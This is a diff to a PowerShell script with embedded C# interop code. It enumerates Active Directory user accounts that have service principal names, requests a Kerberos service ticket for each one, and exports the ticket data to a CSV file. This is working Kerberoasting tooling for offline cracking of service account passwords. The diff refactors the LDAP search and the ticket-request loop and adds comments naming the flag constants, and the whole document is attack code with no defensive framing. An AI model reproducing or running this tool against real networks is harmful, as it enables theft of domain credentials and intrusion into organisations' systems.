@@ -59,7 +59,7 @@ public class K {
         uint attr = 0;
 
         SecBuffer secBuf = new SecBuffer();
-        secBuf.BufferType = 2;
+        secBuf.BufferType = 2; // SECBUFFER_TOKEN
         secBuf.cbBuffer = 0;
         secBuf.pvBuffer = IntPtr.Zero;
 
@@ -75,7 +75,7 @@ public class K {
             if (AcquireCredentialsHandle(
                     null,
                     "Kerberos",
-                    0x00000002,
+                    0x00000002, // SECPKG_CRED_OUTBOUND
                     IntPtr.Zero,
                     IntPtr.Zero,
                     IntPtr.Zero,
@@ -88,7 +88,7 @@ public class K {
                     cred,
                     IntPtr.Zero,
                     spn,
-                    0x00001000,
+                    0x00001000, // ISC_REQ_ALLOCATE_MEMORY
                     0,
                     16,
                     IntPtr.Zero,
@@ -120,81 +120,62 @@ public class K {
 }
 "@
 
-function Get-AdServiceAccountsV2 {
-    Param (
-        [string] $Domain,
-        [int] $PageSize = 200
+function Get-KerberosTicketsForAllSPNs {
+    [CmdletBinding()]
+    Param(
+        [switch]$ExportToCsv,
+        [string]$CsvPath = ".\KerberosTickets.csv"
     )
 
-    $dnsDomain = if ($Domain) { $Domain } else { $env:USERDNSDOMAIN }
-    if (-not $dnsDomain) { throw "Could not resolve DNS domain. Provide -Domain." }
+    Write-Host "Requesting TGS for SPNs:" -ForegroundColor Cyan
 
-    $baseDn = "DC=$($dnsDomain -replace '\.',',DC=')"
-    $ldapPath = "LDAP://$baseDn"
-    $de = New-Object System.DirectoryServices.DirectoryEntry($ldapPath)
-    $ds = New-Object System.DirectoryServices.DirectorySearcher($de)
-    $ds.PageSize = $PageSize
-    $ds.SearchScope = "Subtree"
-    $ds.CacheResults = $false
-    $ds.Filter = "(&(samAccountType=805306368)(servicePrincipalName=*))"
-    $props = @('sAMAccountName','servicePrincipalName','distinguishedName')
-    foreach ($p in $props) { [void]$ds.PropertiesToLoad.Add($p) }
+    $searcher = [ADSISearcher]"(&(samAccountType=805306368)(servicePrincipalName=*))"
+    $searcher.PageSize = 1000
+    $searcher.PropertiesToLoad.Add("samAccountName") | Out-Null
+    $searcher.PropertiesToLoad.Add("servicePrincipalName") | Out-Null
 
     try {
-        $results = $ds.FindAll()
+        $results = $searcher.FindAll()
     } catch {
-        Write-Error "LDAP search failed: $_"
+        Write-Error "Failed to query Active Directory: $_"
         return
     }
 
-    foreach ($r in $results) {
-        $z = $r.Properties
-        $spns = $z['serviceprincipalname']
-        if ($spns) {
+    if ($results -and $results -is [System.Collections.IEnumerable]) {
+        $output = @()
+
+        foreach ($r in $results) {
+            $spns = $r.Properties["servicePrincipalName"]
+            $user = $r.Properties["samAccountName"]
+
             foreach ($spn in $spns) {
-                [PSCustomObject]@{
-                    SamAccountName       = $z['samaccountname'][0]
-                    DistinguishedName    = $z['distinguishedname'][0]
-                    SPN                  = $spn
+                Write-Host "`n[$user] $spn" -ForegroundColor Green
+
+                try {
+                    $ticket = [K]::GetTicket($spn)
+                    if ($ticket) {
+                        $obj = [PSCustomObject]@{
+                            SamAccountName = $user
+                            SPN            = $spn
+                            TicketHex      = $ticket
+                        }
+                        $output += $obj
+                    } else {
+                        Write-Warning "No ticket retrieved for $spn"
+                    }
+                } catch {
+                    Write-Warning "Failed to get ticket for $spn: $_"
                 }
             }
         }
-    }
 
-    $ds.Dispose()
-    $de.Dispose()
-}
-
-function Get-KerberosTicketsForAllSPNs {
-    Param (
-        [switch] $ExportToCsv
-    )
-
-    $results = Get-AdServiceAccountsV2
-    $tickets = @()
-
-    foreach ($r in $results) {
-        Write-Host "`nRequesting TGS for SPN: $($r.SPN)"
-        try {
-            $ticket = [K]::GetTicket($r.SPN)
-            $obj = [PSCustomObject]@{
-                Account = $r.SamAccountName
-                SPN     = $r.SPN
-                Ticket  = $ticket
-            }
-            $tickets += $obj
-        } catch {
-            Write-Warning "Failed to get ticket for SPN $($r.SPN): $_"
+        if ($ExportToCsv -and $output.Count -gt 0) {
+            $output | Export-Csv -Path $CsvPath -NoTypeInformation -Force
+            Write-Host "`nSaved to: $CsvPath" -ForegroundColor Yellow
         }
-    }
 
-    if ($ExportToCsv) {
-        $tickets | Export-Csv "KerberosTickets.csv" -NoTypeInformation -Encoding UTF8
-        Write-Host "`nTickets exported to KerberosTickets.csv"
+        return $output
     } else {
-        $tickets
+        Write-Warning "LDAP query returned no usable results. AD may be unreachable or .NET config is broken."
     }
 }
-
-# Run this to start:
-# Get-KerberosTicketsForAllSPNs -ExportToCsv
